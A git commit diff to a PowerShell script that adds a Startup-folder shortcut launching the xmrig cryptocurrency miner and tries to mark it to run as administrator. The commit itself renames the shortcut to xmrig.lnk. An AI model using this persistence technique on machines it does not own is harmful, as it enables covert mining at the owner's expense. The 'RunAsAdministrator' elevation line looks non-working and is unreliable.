cef2d7fe9d636b5bbacd3a98d0ec2db1f4581178
Peekaboo-ICU <134564332+Peekaboo-ICU@users.noreply.github.com>
2023-07-04 13:55:40 +1000

    Update RunOnStartupAsAdmin.ps1

--- RunOnStartupAsAdmin.ps1
+++ RunOnStartupAsAdmin.ps1
@@ -1,11 +1,10 @@
 $scriptPath = "C:\temp\xmrig.exe"
-$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RunAsAdmin.lnk"
+$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\xmrig.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = $scriptPath
 $shortcut.Save()
-
 # Elevate the shortcut to run as administrator
 $shortcut.Properties("RunAsAdministrator").Value = 1
 $shortcut.Save()
